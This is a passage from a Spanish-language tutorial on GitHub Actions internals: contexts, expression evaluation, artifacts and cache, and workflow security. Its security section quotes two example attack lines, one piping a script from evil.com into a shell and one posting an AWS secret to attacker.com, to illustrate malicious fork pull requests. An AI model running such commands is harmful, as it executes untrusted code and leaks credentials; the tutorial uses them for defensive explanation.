Job 9: macOS + Node 20

Todos se ejecutan EN PARALELO
```

**El contexto `steps`: Comunicación entre pasos**

Los steps pueden compartir información usando `outputs`:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Step 1: Genera un valor
      - name: Get version
        id: version
        run: echo "value=v1.2.3" >> $GITHUB_OUTPUT
      
      # Step 2: Usa el valor del Step 1
      - name: Use version
        run: |
          echo "Version is: ${{ steps.version.outputs.value }}"
          # Output: Version is: v1.2.3
```

**El contexto `needs`: Comunicación entre jobs**

Los jobs pueden compartir información usando `outputs`:

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.get_version.outputs.value }}
    steps:
      - id: get_version
        run: echo "value=v1.2.3" >> $GITHUB_OUTPUT
  
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Deploying version ${{ needs.build.outputs.version }}"
          # Output: Deploying version v1.2.3
```

**Contextos como sistema de memoria**

Los contextos forman un **sistema de memoria** del workflow:

```
MEMORIA A CORTO PLAZO (steps):
  - Vive dentro de un job
  - Se pierde al terminar el job
  - Rápido de acceder

MEMORIA A MEDIANO PLAZO (needs):
  - Vive entre jobs del mismo workflow run
  - Se pierde al terminar el workflow
  - Permite comunicación job-a-job

MEMORIA A LARGO PLAZO (artifacts/cache):
  - Vive entre workflow runs
  - Persiste días/semanas
  - Más lento de acceder
```

**¿Por qué entender contextos te da poder?**

1. **Workflows dinámicos**: Reaccionar según el contexto
2. **Debugging efectivo**: Sabes qué información tienes disponible
3. **Optimización**: Compartir datos entre jobs eficientemente
4. **Condicionales inteligentes**: Ejecutar solo cuando debe
5. **Seguridad**: Usar secrets correctamente
6. **Paralelización**: Matrices complejas

Los contextos son el **lenguaje** que habla tu workflow. Domínalos y dominarás GitHub Actions.

---

### 6.1 ¿Qué es un Contexto?

Un **contexto** es un **objeto JSON que contiene información** disponible en diferentes etapas del workflow.

**Analogía**: Son como "variables globales" que GitHub inyecta en tu workflow.

### 6.2 Dónde se Crean los Contextos

```
TIMELINE DE CREACIÓN
────────────────────

T0: Usuario hace git push
    ↓
T1: GitHub genera EVENTO
    ↓
T2: GitHub crea WORKFLOW RUN
    ├─ Se crea contexto "github" (info del evento, repo, etc.)
    ├─ Se crea contexto "env" (variables globales del workflow)
    ├─ Se crea contexto "secrets" (acceso a secrets del repo)
    └─ Se crea contexto "vars" (variables de configuración)
    ↓
T3: GitHub planifica JOB 1
    ├─ Se crea contexto "strategy" (si hay matrix)
    ├─ Se crea contexto "matrix" (valores actuales del matrix)
    └─ Se crea contexto "needs" (outputs de jobs anteriores)
    ↓
T4: Runner empieza a ejecutar JOB 1
    ├─ Se crea contexto "runner" (info del runner)
    └─ Se crea contexto "job" (info del job actual)
    ↓
T5: Se ejecuta STEP 1
    ├─ Se actualiza contexto "steps" (outputs de steps anteriores)
    └─ Se crea contexto "inputs" (si es workflow_call o workflow_dispatch)
```

### 6.3 Contextos Principales

#### 6.3.1 Contexto `github`

**Contiene**: Información del evento, repositorio, workflow

**Ejemplo real**:
```yaml
name: Debug Context
on: push
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: Ver evento
        run: |
          echo "Evento: ${{ github.event_name }}"
          # Output: push
          
          echo "Branch: ${{ github.ref }}"
          # Output: refs/heads/main
          
          echo "SHA: ${{ github.sha }}"
          # Output: def456789abcdef...
          
          echo "Quien hizo push: ${{ github.actor }}"
          # Output: dukono
          
          echo "Repositorio: ${{ github.repository }}"
          # Output: usuario/mi-repo
```

**Propiedades importantes**:
```javascript
github = {
  event_name: "push",           // Tipo de evento
  event: { /* payload completo */ },  // Todo el JSON del evento
  sha: "def456...",             // Commit SHA que disparó el workflow
  ref: "refs/heads/main",       // Referencia (branch/tag)
  ref_name: "main",             // Nombre limpio del branch
  repository: "usuario/repo",   // Repo completo
  repository_owner: "usuario",  // Dueño del repo
  actor: "dukono",              // Usuario que disparó el evento
  workflow: "CI",               // Nombre del workflow
  run_id: "123456789",          // ID único de esta ejecución
  run_number: "42",             // Número secuencial de ejecución
  job: "build",                 // ID del job actual
  action: "actions/checkout",   // Action actual (si aplica)
  workspace: "/home/runner/work/repo/repo"  // Directorio de trabajo
}
```

#### 6.3.2 Contexto `env`

**Contiene**: Variables de entorno definidas en el workflow

```yaml
env:
  GLOBAL_VAR: "valor1"

jobs:
  test:
    env:
      JOB_VAR: "valor2"
    steps:
      - name: Usar variables
        env:
          STEP_VAR: "valor3"
        run: |
          echo "${{ env.GLOBAL_VAR }}"  # valor1
          echo "${{ env.JOB_VAR }}"     # valor2
          echo "${{ env.STEP_VAR }}"    # valor3
          
          # También disponibles como env vars normales:
          echo "$GLOBAL_VAR"            # valor1
          echo "$JOB_VAR"               # valor2
          echo "$STEP_VAR"              # valor3
```

**Alcance (scope)**:
```
env: (nivel workflow)
  └─ Disponible en TODOS los jobs y steps

jobs:
  test:
    env: (nivel job)
      └─ Disponible solo en este job
      
    steps:
      - env: (nivel step)
          └─ Disponible solo en este step
```

#### 6.3.3 Contexto `secrets`

**Contiene**: Secrets configurados en GitHub

**Dónde se configuran**:
```
GitHub.com → Tu Repo → Settings → Secrets and variables → Actions
```

**Uso**:
```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          # Los secrets NO se imprimen en logs (GitHub los oculta)
          deploy.sh
        env:
          API_KEY: ${{ secrets.API_KEY }}
          DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
```

**IMPORTANTE**: Los secrets están **encriptados** y GitHub los **oculta automáticamente** en los logs:
```
# En tu script:
echo "API Key: $API_KEY"

# En los logs verás:
API Key: ***
```

#### 6.3.4 Contexto `steps`

**Contiene**: Outputs de steps anteriores

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1
        id: primer-step  # ← ID obligatorio para referenciarlo
        run: |
          echo "resultado=exitoso" >> $GITHUB_OUTPUT
          echo "numero=42" >> $GITHUB_OUTPUT
      
      - name: Step 2
        run: |
          # Acceder a outputs del step anterior:
          echo "Resultado: ${{ steps.primer-step.outputs.resultado }}"
          # Output: exitoso
          
          echo "Número: ${{ steps.primer-step.outputs.numero }}"
          # Output: 42
```

**Cómo funciona técnicamente**:
1. `$GITHUB_OUTPUT` es un archivo temporal en el runner
2. Cuando escribes `echo "key=value" >> $GITHUB_OUTPUT`
3. GitHub lee ese archivo al final del step
4. Crea `steps.primer-step.outputs.key = "value"`
5. Lo hace disponible para steps posteriores

#### 6.3.5 Contexto `needs`

**Contiene**: Outputs de jobs anteriores

```yaml
jobs:
  job1:
    runs-on: ubuntu-latest
    outputs:
      resultado: ${{ steps.calculo.outputs.resultado }}
    steps:
      - id: calculo
        run: echo "resultado=100" >> $GITHUB_OUTPUT
  
  job2:
    needs: job1  # ← Declara dependencia
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Resultado de job1: ${{ needs.job1.outputs.resultado }}"
          # Output: 100
```

**Múltiples dependencias**:
```yaml
jobs:
  build:
    outputs:
      version: ${{ steps.ver.outputs.version }}
    steps:
      - id: ver
        run: echo "version=1.2.3" >> $GITHUB_OUTPUT
  
  test:
    outputs:
      status: ${{ steps.test.outputs.status }}
    steps:
      - id: test
        run: echo "status=passed" >> $GITHUB_OUTPUT
  
  deploy:
    needs: [build, test]  # ← Depende de AMBOS
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Version: ${{ needs.build.outputs.version }}"
          echo "Tests: ${{ needs.test.outputs.status }}"
```

#### 6.3.6 Contexto `runner`

**Contiene**: Información del runner ejecutando el job

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "OS: ${{ runner.os }}"           # Linux
          echo "Arch: ${{ runner.arch }}"       # X64
          echo "Name: ${{ runner.name }}"       # GitHub Actions 2
          echo "Tool cache: ${{ runner.tool_cache }}"  # /opt/hostedtoolcache
```

#### 6.3.7 Contexto `matrix`

**Contiene**: Valores actuales en una estrategia matrix

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [14, 16, 18]
    runs-on: ${{ matrix.os }}
    steps:
      - run: |
          echo "OS: ${{ matrix.os }}"
          echo "Node: ${{ matrix.node }}"
```

**Técnicamente, crea 6 jobs (3×2)**:
```
Job 1: os=ubuntu-latest, node=14
Job 2: os=ubuntu-latest, node=16
Job 3: os=ubuntu-latest, node=18
Job 4: os=windows-latest, node=14
Job 5: os=windows-latest, node=16
Job 6: os=windows-latest, node=18
```

### 6.4 Tabla Resumen de Contextos

| Contexto | Disponible en | Contiene | Ejemplo |
|----------|--------------|----------|---------|
| `github` | Todos lados | Info del evento/repo | `github.sha` |
| `env` | Todos lados | Variables de entorno | `env.NODE_ENV` |
| `secrets` | Todos lados | Secrets del repo | `secrets.API_KEY` |
| `vars` | Todos lados | Variables de configuración | `vars.ENVIRONMENT` |
| `job` | En el job | Info del job actual | `job.status` |
| `steps` | En steps posteriores | Outputs de steps previos | `steps.build.outputs.version` |
| `runner` | En el job | Info del runner | `runner.os` |
| `needs` | En jobs dependientes | Outputs de jobs previos | `needs.build.outputs.tag` |
| `strategy` | En jobs con matrix | Config de la estrategia | `strategy.fail-fast` |
| `matrix` | En jobs con matrix | Valores actuales del matrix | `matrix.os` |
| `inputs` | En workflow_dispatch/call | Inputs del usuario | `inputs.environment` |

---

## 7. EXPRESIONES Y MOTOR DE EVALUACIÓN

### Introducción: El Lenguaje de Programación de GitHub Actions

Las **expresiones** son el "lenguaje de programación" de GitHub Actions. Mientras que los workflows se escriben en YAML (que es declarativo, no programable), las expresiones te dan **lógica y computación**.

**¿Qué es una expresión?**

Una expresión NO es solo "acceder a una variable". Es:

1. **Un lenguaje de scripting**: Con sintaxis propia
2. **Un motor de evaluación**: Que se ejecuta ANTES de llegar al runner
3. **Lógica condicional**: if, operadores, funciones
4. **Transformación de datos**: Filtrar, mapear, comparar
5. **Acceso a contextos**: Leer información del workflow

**La sintaxis: `${{ ... }}`**

```yaml
# SIN expresión (string literal):
run: echo "hello world"  # Imprime: hello world

# CON expresión (evaluada por GitHub):
run: echo "${{ github.sha }}"  # Imprime: abc123def456...

# CON expresión compleja:
if: ${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}
```

**¿Cuándo se evalúan las expresiones?**

Este es un concepto **crucial** que muchos no entienden:

```
Timeline de evaluación:

T1: Escribes el workflow.yml
    ↓
T2: Haces git push
    ↓
T3: GitHub recibe el evento
    ↓
T4: GitHub EVALÚA LAS EXPRESIONES
    ┌──────────────────────────────────┐
    │ ⚠️ AQUÍ SE EVALÚAN              │
    │ Las expresiones se resuelven     │
    │ ANTES de enviar al runner        │
    │                                  │
    │ ${{ github.sha }}                │
    │    ↓ se convierte en             │
    │ "abc123def456..."                │
    └──────────────────────────────────┘
    ↓
T5: GitHub envía job al runner
    (El runner recibe comandos ya procesados)
```

**Ejemplo concreto:**

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.sha }}"
```

```
Lo que ESCRIBES:
  run: echo "${{ github.sha }}"

Lo que GitHub EVALÚA (antes de enviar al runner):
  run: echo "abc123def456789..."

Lo que el RUNNER recibe:
  run: echo "abc123def456789..."

Lo que se EJECUTA en bash:
  $ echo "abc123def456789..."
  abc123def456789...
```

**¿Por qué esto importa?**

Porque las expresiones **NO se ejecutan en el runner**. Se evalúan en **GitHub.com antes** de enviar el job:

```yaml
# ❌ INCORRECTO: Intentar usar expresiones para lógica del runner
- run: |
    if ${{ github.ref == 'refs/heads/main' }}; then
      echo "main branch"
    fi
# Esto falla porque bash recibe:
# if refs/heads/main == 'refs/heads/main'; then
# (sintaxis inválida de bash)

# ✅ CORRECTO: Usar expresiones en YAML, bash en bash
- run: echo "main branch"
  if: github.ref == 'refs/heads/main'
# O usar bash nativo:
- run: |
    if [ "${{ github.ref }}" == "refs/heads/main" ]; then
      echo "main branch"
    fi
```

**Los dos mundos: YAML vs Shell**

```
┌───────────────────────────────────────────────────────┐
│ MUNDO 1: YAML (GitHub.com)                           │
├───────────────────────────────────────────────────────┤
│ Se evalúa: Antes de llegar al runner                 │
│ Lenguaje: Expresiones de GitHub Actions              │
│ Sintaxis: ${{ ... }}                                  │
│ Ejemplos:                                             │
│   if: github.ref == 'refs/heads/main'                │
│   with:                                               │
│     value: ${{ github.sha }}                          │
└───────────────────────────────────────────────────────┘
        ↓ Después de evaluar
┌───────────────────────────────────────────────────────┐
│ MUNDO 2: SHELL (Runner)                              │
├───────────────────────────────────────────────────────┤
│ Se ejecuta: En el runner                             │
│ Lenguaje: Bash/PowerShell/CMD                        │
│ Sintaxis: Nativa del shell                           │
│ Ejemplos:                                             │
│   if [ "$GITHUB_REF" == "refs/heads/main" ]; then    │
│   curl -H "Authorization: $API_TOKEN" ...            │
└───────────────────────────────────────────────────────┘
```

**El poder de las expresiones**

Las expresiones transforman GitHub Actions de un sistema estático a uno **dinámico y programable**:

```yaml
# Sin expresiones (estático):
jobs:
  deploy-dev:
    runs-on: ubuntu-latest
    steps: [...]
  deploy-staging:
    runs-on: ubuntu-latest
    steps: [...]
  deploy-prod:
    runs-on: ubuntu-latest
    steps: [...]
# 3 jobs separados

# Con expresiones (dinámico):
jobs:
  deploy:
    strategy:
      matrix:
        environment: ${{ fromJSON(
          github.ref == 'refs/heads/main' && '["dev","staging","prod"]' ||
          github.ref == 'refs/heads/develop' && '["dev","staging"]' ||
          '["dev"]'
        ) }}
    runs-on: ubuntu-latest
    steps: [...]
# 1 job, comportamiento dinámico basado en branch
```

**¿Por qué dominar expresiones te da poder?**

1. **Workflows inteligentes**: Lógica condicional compleja
2. **Código DRY**: Reutilizar con lógica, no duplicar
3. **Debugging avanzado**: Entiendes qué se evalúa y cuándo
4. **Optimización**: Ejecutar solo lo necesario
5. **Flexibilidad**: Workflows que se adaptan al contexto

Las expresiones son el **cerebro** de tus workflows. Sin ellas, tienes músculos (runners) pero no inteligencia.

---

### 7.1 ¿Qué son las Expresiones?

Las expresiones son **código evaluado por GitHub** antes de enviar el job al runner.

**Sintaxis**: `${{ ... }}`

**Dónde se evalúan**: En los servidores de GitHub, NO en el runner.

### 7.2 Momento de Evaluación

```
TIMELINE
────────

T1: GitHub recibe el evento
    ↓
T2: GitHub lee tu workflow.yml
    ↓
T3: GitHub EVALÚA las expresiones ${{ ... }}
    │
    ├─ Reemplaza ${{ github.ref }} por "refs/heads/main"
    ├─ Evalúa if: ${{ github.event_name == 'push' }}
    └─ Genera el YAML final con valores concretos
    ↓
T4: Envía el YAML procesado al runner
    ↓
T5: Runner ejecuta comandos (ya no hay ${{ ... }}, solo valores)
```

**Ejemplo**:

```yaml
# TU ESCRIBES:
jobs:
  test:
    if: ${{ github.ref == 'refs/heads/main' }}
    runs-on: ubuntu-latest
    steps:
      - run: echo "Branch: ${{ github.ref }}"

# GITHUB EVALÚA (antes de enviar al runner):
# Supongamos github.ref = "refs/heads/main"

# RESULTADO:
jobs:
  test:
    if: true  # ← Evaluado a boolean
    runs-on: ubuntu-latest
    steps:
      - run: echo "Branch: refs/heads/main"  # ← Reemplazado
```

### 7.3 Diferencia: Expresiones vs Variables de Entorno

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # EXPRESIÓN (evaluada por GitHub):
      - run: echo "${{ github.sha }}"
        # GitHub reemplaza ANTES de ejecutar
        # Runner recibe: echo "abc123..."
      
      # VARIABLE DE ENTORNO (evaluada por el shell):
      - run: echo "$GITHUB_SHA"
        # Runner recibe: echo "$GITHUB_SHA"
        # Bash reemplaza al ejecutar
```

**Ambas dan el mismo resultado, pero el proceso es diferente**:
- `${{ github.sha }}`: GitHub lo procesa → Runner recibe valor final
- `$GITHUB_SHA`: Runner recibe la variable → Shell la expande

### 7.4 Funciones Disponibles

#### Comparación
```yaml
${{ github.ref == 'refs/heads/main' }}           # Igualdad
${{ github.event_name != 'push' }}               # Desigualdad
${{ github.run_number > 100 }}                   # Mayor que
${{ github.actor == 'dukono' || github.actor == 'admin' }}  # OR
${{ github.ref == 'refs/heads/main' && github.event_name == 'push' }}  # AND
```

#### Funciones de String
```yaml
${{ contains(github.ref, 'feature') }}           # Contiene substring
${{ startsWith(github.ref, 'refs/heads/') }}     # Empieza con
${{ endsWith(github.ref, '/main') }}             # Termina con
${{ format('Version: {0}.{1}', '1', '2') }}      # Formato (Output: Version: 1.2)
```

#### Funciones de Estado
```yaml
${{ success() }}       # Step anterior exitoso
${{ failure() }}       # Step anterior falló
${{ cancelled() }}     # Workflow cancelado
${{ always() }}        # Siempre (ignora estado)
```

**Uso común**:
```yaml
steps:
  - name: Test
    run: npm test
  
  - name: Notify on failure
    if: ${{ failure() }}  # Solo si el step anterior falló
    run: echo "Tests failed!"
  
  - name: Cleanup
    if: ${{ always() }}   # Siempre se ejecuta, incluso si falló
    run: rm -rf temp/
```

#### Funciones JSON
```yaml
${{ toJSON(github.event) }}      # Convierte objeto a JSON string
${{ fromJSON('{"key": "value"}') }}  # Parse JSON string a objeto
```

**Ejemplo práctico**:
```yaml
steps:
  - name: Ver evento completo
    run: echo '${{ toJSON(github.event) }}'
    # Imprime todo el payload del evento en JSON
```

### 7.5 Valores por Defecto

```yaml
${{ github.event.pull_request.title || 'No PR title' }}
# Si no hay PR, usa el valor por defecto
```

---

## 8. SISTEMA DE ALMACENAMIENTO

### Introducción: Persistencia en un Mundo Efímero

Los runners son **efímeros**: se destruyen después de cada job. Pero, ¿qué pasa si necesitas **conservar datos** entre jobs o entre ejecuciones? Aquí entra el **sistema de almacenamiento** de GitHub Actions.

**El problema**:
```
Job 1 (Runner A):
  - Compila código → genera "app.exe"
  - Runner se destruye → app.exe DESAPARECE

Job 2 (Runner B):
  - Necesita "app.exe" para testing
  - Pero app.exe no existe (otro runner)
  - ❌ No puede testear
```

**La solución**: Tres sistemas de almacenamiento:

1. **Artifacts**: Archivos entre jobs (mismo workflow run)
2. **Cache**: Dependencias entre workflow runs
3. **Outputs**: Datos pequeños entre jobs

**¿Por qué necesitas entender esto?**

Porque determina:
- Cómo compartir código compilado entre jobs
- Cómo evitar descargar dependencias siempre
- Cómo optimizar tiempos de build (de minutos a segundos)
- Cómo hacer que los jobs se comuniquen

**La arquitectura de almacenamiento**:

```
┌─────────────────────────────────────────────────┐
│  RUNNER (Efímero)                               │
│  - Filesystem temporal                          │
│  - Se destruye al terminar                      │
└──────────┬──────────────────────────────────────┘
           │
           │ Subir datos
           ↓
┌─────────────────────────────────────────────────┐
│  GITHUB STORAGE (Persistente)                   │
│  ┌───────────────────────────────────────────┐  │
│  │ ARTIFACTS                                 │  │
│  │ - Duración: 90 días                       │  │
│  │ - Uso: Compartir archivos entre jobs      │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │ CACHE                                     │  │
│  │ - Duración: 7 días (sin uso)              │  │
│  │ - Uso: Reutilizar dependencias            │  │
│  └───────────────────────────────────────────┘  │
│  ┌───────────────────────────────────────────┐  │
│  │ OUTPUTS                                   │  │
│  │ - Duración: Solo el workflow run          │  │
│  │ - Uso: Pasar strings entre jobs           │  │
│  └───────────────────────────────────────────┘  │
└─────────────────────────────────────────────────┘
```

**Artifacts vs Cache vs Outputs**: Las diferencias clave

```
┌──────────────────────────────────────────────────────┐
│  ARTIFACTS                                           │
├──────────────────────────────────────────────────────┤
│  Propósito: Compartir ARCHIVOS entre jobs           │
│  Scope: Dentro del mismo workflow run                │
│  Tamaño: Hasta 10 GB por archivo                     │
│  Velocidad: ~1 MB/s (subida/bajada)                  │
│  Ejemplo: Binarios compilados, reportes, screenshots │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│  CACHE                                               │
├──────────────────────────────────────────────────────┤
│  Propósito: Reutilizar DEPENDENCIAS                  │
│  Scope: Entre workflow runs (hasta 7 días)           │
│  Tamaño: Hasta 10 GB total por repo                  │
│  Velocidad: ~5 MB/s (más rápido que artifacts)       │
│  Ejemplo: node_modules, pip packages, Maven deps     │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│  OUTPUTS                                             │
├──────────────────────────────────────────────────────┤
│  Propósito: Pasar STRINGS entre jobs                 │
│  Scope: Dentro del mismo workflow run                │
│  Tamaño: Hasta 1 MB por output                       │
│  Velocidad: Instantáneo (metadata)                   │
│  Ejemplo: Version numbers, build IDs, tags           │
└──────────────────────────────────────────────────────┘
```

**Cuándo usar cada uno**:

```
Usa ARTIFACTS cuando:
✓ Generas archivos en un job y los necesitas en otro
✓ Quieres descargar resultados después del workflow
✓ Compartes binarios, reportes, logs entre jobs

Usa CACHE cuando:
✓ Instalas dependencias (npm install, pip install)
✓ Compilas código que no cambia frecuentemente
✓ Quieres acelerar workflows subsiguientes

Usa OUTPUTS cuando:
✓ Necesitas pasar un string/número entre jobs
✓ Calculas una versión, tag, o ID
✓ El dato es pequeño (< 1 MB)
```

**El costo del almacenamiento**:

GitHub Actions storage NO es gratis (excepto repos públicos):

```
ARTIFACTS:
- Público: Gratis
- Privado: Cuenta contra tu límite de storage
- Límite: Varía por plan (500 MB - 50 GB)

CACHE:
- Todos: 10 GB por repositorio
- Gratis en todos los planes
- Se limpia automáticamente (LRU)

OUTPUTS:
- Todos: Gratis
- No cuenta contra límites
- Es metadata, no storage real
```

Veamos cada sistema en detalle.

---

### 8.1 Artifacts

**Qué son**: Archivos generados durante el workflow que quieres conservar.

**Ejemplos**: Binarios compilados, logs, reportes, capturas de pantalla.

**Dónde se guardan**: Servidores de GitHub (no en el runner).

**Cuánto duran**: 90 días por defecto (configurable).

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Compilar
        run: gcc main.c -o app
      
      - name: Subir binario
        uses: actions/upload-artifact@v4
        with:
          name: mi-aplicacion
          path: app
  
  test:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - name: Descargar binario
        uses: actions/download-artifact@v4
        with:
          name: mi-aplicacion
      
      - name: Ejecutar
        run: ./app
```

**Flujo técnico**:
```
Job Build (Runner 1)
    ↓
  Genera archivo "app"
    ↓
  upload-artifact envía a GitHub.com
    ↓
GitHub almacena en su storage (S3/Azure)
    ↓
Job Test (Runner 2) - Máquina completamente diferente
    ↓
  download-artifact descarga desde GitHub.com
    ↓
  Archivo "app" disponible en el nuevo runner
```

### 8.2 Cache

**Qué es**: Sistema para reutilizar dependencias entre ejecuciones.

**Ejemplos**: node_modules, pip packages, Maven dependencies.

**Cuánto dura**: Hasta 7 días sin uso (o hasta 10 GB por repo).

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Cache node_modules
        uses: actions/cache@v4
        with:
          path: node_modules
          key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}
      
      - name: Install
        run: npm install  # Solo si no hay cache
```

**Flujo técnico**:
```
Primera ejecución:
  1. cache@v4 busca key "Linux-node-abc123..."
  2. No existe → cache miss
  3. npm install descarga todo (2 minutos)
  4. cache@v4 guarda node_modules con esa key

Segunda ejecución (mismo package-lock.json):
  1. cache@v4 busca key "Linux-node-abc123..."
  2. Existe → cache hit
  3. Descarga node_modules desde cache (10 segundos)
  4. NO ejecuta npm install
```

### 8.3 Diferencia: Artifacts vs Cache

| Característica | Artifacts | Cache |
|----------------|-----------|-------|
| Propósito | Compartir entre jobs | Acelerar builds repetidos |
| Persistencia | 90 días | 7 días sin uso |
| Descarga | Explícita (download-artifact) | Automática (si key coincide) |
| Límite | Ilimitado (pero cuenta en minutos) | 10 GB por repo |

---

## 9. SEGURIDAD Y AISLAMIENTO

### Introducción: Ejecutar Código Ajeno de Forma Segura

GitHub Actions enfrenta un desafío único: ejecutar **código de cualquier persona** en su infraestructura. Cada día se ejecutan millones de workflows, algunos de repositorios públicos que cualquiera puede modificar. ¿Cómo evitar que un workflow malicioso comprometa el sistema?

**El problema de seguridad fundamental**

```
Escenario peligroso:
┌────────────────────────────────────────────┐
│ Pull Request de un desconocido            │
│                                            │
│ Workflow: .github/workflows/ci.yml        │
│   - run: |                                 │
│       curl https://evil.com/steal.sh | sh  │
│       # Roba secrets, modifica código      │
└────────────────────────────────────────────┘

Sin seguridad:
❌ Podría robar ${{ secrets.AWS_TOKEN }}
❌ Podría modificar otros workflows
❌ Podría acceder a otros runners
❌ Podría comprometer la infraestructura de GitHub
```

**La solución: Múltiples capas de seguridad**

GitHub Actions implementa seguridad en **5 capas independientes**:

```
CAPA 1: Aislamiento de Runners
  → Cada job en VM/container separado
  → No puede ver otros jobs
  → Filesystem independiente

CAPA 2: Secrets Encriptados
  → Nunca se exponen en logs
  → Solo accesibles durante ejecución
  → Cifrados en reposo y tránsito

CAPA 3: Permisos Granulares (GITHUB_TOKEN)
  → Control de qué puede hacer el workflow
  → Acceso mínimo por defecto
  → Configurable por workflow

CAPA 4: Restricciones de PRs
  → PRs de forks no tienen acceso a secrets
  → Requieren aprobación para ejecutar
  → Ejecutan en contexto del fork

CAPA 5: Audit Logs
  → Todo se registra
  → Trazabilidad completa
  → Análisis de seguridad
```

**El modelo de "confianza cero"**

GitHub Actions NO confía en nada por defecto:

```
NO CONFÍA EN:
✗ Código de PRs de desconocidos
✗ Actions de terceros automáticamente
✗ Runners compartidos entre repos
✗ Variables de entorno sin validar
✗ Comandos sin verificar origen

CONFÍA EN (con verificación):
✓ Código del repo después de autenticación
✓ Actions del marketplace verificadas (badge)
✓ Aislamiento de VMs/containers
✓ Encriptación de secrets
✓ Tokens con permisos limitados
```

**¿Por qué necesitas entender seguridad en Actions?**

1. **Evitar fugas de credenciales**: Secrets pueden llegar a logs si no tienes cuidado
2. **PRs seguros**: Debes saber cuándo aprobar workflows de contributors
3. **Permisos correctos**: Dar más permisos de los necesarios es peligroso
4. **Compliance**: Regulaciones (GDPR, SOC2) requieren controles
5. **Auditoría**: Necesitas rastrear quién hizo qué

**El peligro oculto de los Pull Requests**

Esta es la amenaza de seguridad #1 en GitHub Actions:

```
Ataque típico:
1. Usuario malicioso forkea tu repo público
2. Modifica .github/workflows/ci.yml:
   - run: |
       echo "Secret: ${{ secrets.AWS_TOKEN }}"
       curl -X POST https://attacker.com -d "${{ secrets.AWS_TOKEN }}"
3. Abre Pull Request a tu repo
4. ¿GitHub ejecuta el workflow modificado?

PROTECCIÓN de GitHub:
→ PRs de forks NO tienen acceso a secrets por defecto
→ Workflows de PRs de forks requieren aprobación manual
→ Se ejecutan con GITHUB_TOKEN de permisos read-only
→ No pueden pushear a tu repo
```

**Secrets: El eslabón más débil**

Los secrets son poderosos pero peligrosos:

```
CORRECTO:
- name: Deploy
  env:
    AWS_KEY: ${{ secrets.AWS_KEY }}
  run: |
    aws configure set aws_access_key_id $AWS_KEY
    aws s3 sync dist/ s3://bucket/
  # Secret solo en variable de entorno

INCORRECTO (FUGA):
- name: Debug
  run: echo "Key is ${{ secrets.AWS_KEY }}"
  # GitHub censura en logs, pero INTENTO quedó registrado
  
- name: Deploy
  run: |
    echo ${{ secrets.AWS_KEY }} > /tmp/key
    # Archivo temporal puede ser accedido
```

**Aislamiento: La defensa en profundidad**

Cada nivel de aislamiento protege contra diferentes ataques:

```
NIVEL 1: Entre Repositorios
  Repo A no puede ver Repo B
  ✓ Protege contra: Acceso cross-repo

NIVEL 2: Entre Workflow Runs  
  Run #1 no puede ver Run #2
  ✓ Protege contra: Estado persistente malicioso

NIVEL 3: Entre Jobs
  Job A no puede ver Job B (del mismo workflow)
  ✓ Protege contra: Job malicioso afectando otros

NIVEL 4: Filesystem
  Cada job tiene filesystem limpio
  ✓ Protege contra: Malware persistente
```

**GITHUB_TOKEN: Tu identidad en el workflow**

Cada workflow recibe automáticamente un token temporal:

```
GITHUB_TOKEN:
  ✓ Generado automáticamente
  ✓ Expira cuando termina el job
  ✓ Permisos configurables
  ✓ No necesita estar en secrets

Permisos por defecto (restrictivos):
  ✓ contents: read     (leer código)
  ✓ metadata: read     (info del repo)
  
  ✗ contents: write    (NO puede pushear)
  ✗ issues: write      (NO puede crear issues)
  ✗ pull-requests: write (NO puede mergear PRs)
```

**Best practices de seguridad**

```
1. Mínimo privilegio:
   permissions:
     contents: read  # Solo lo necesario

2. Validar inputs:
   - name: Deploy
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
     # Solo en condiciones específicas

3. Usar secrets correctamente:
   env:
     API_KEY: ${{ secrets.API_KEY }}
   # En variable de entorno, no en comandos directos

4. Pin de actions por SHA:
   - uses: actions/checkout@8ade135  # SHA completo
   # No: @v4 (puede cambiar)

5. Revisar workflows de PRs:
   → Aprobar solo si confías en el código
   → Verificar que no expongan secrets
```

La seguridad en GitHub Actions es como cebollas: múltiples capas. Si una falla, las demás te protegen.

---

### 9.1 Modelo de Seguridad

```
┌─────────────────────────────────────────────────┐
│            GITHUB.COM (Trusted)                 │
│  - Gestiona secrets                             │
│  - Controla permisos (GITHUB_TOKEN)             │
│  - Audita todas las acciones                    │
└─────────────────┬───────────────────────────────┘
                  │ Envía job
                  ↓
┌─────────────────────────────────────────────────┐
│            RUNNER (Untrusted Zone)              │
│  - Ejecuta código del repo (puede ser malicioso)│
│  - Tiene acceso a secrets (si se pasan)         │
│  - Aislado de otros runners                     │
│  - Destruido después del job                    │
└─────────────────────────────────────────────────┘
```

### 9.2 GITHUB_TOKEN

**Qué es**: Token de autenticación automático para cada workflow.

**Creación**: GitHub lo genera automáticamente al iniciar el workflow.

**Permisos**: Configurables, por defecto tiene acceso limitado.

**Uso**:
```yaml
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Crear release
        run: |
          gh release create v1.0.0 \
            --title "Version 1.0.0" \
            --notes "Release notes"
        env:
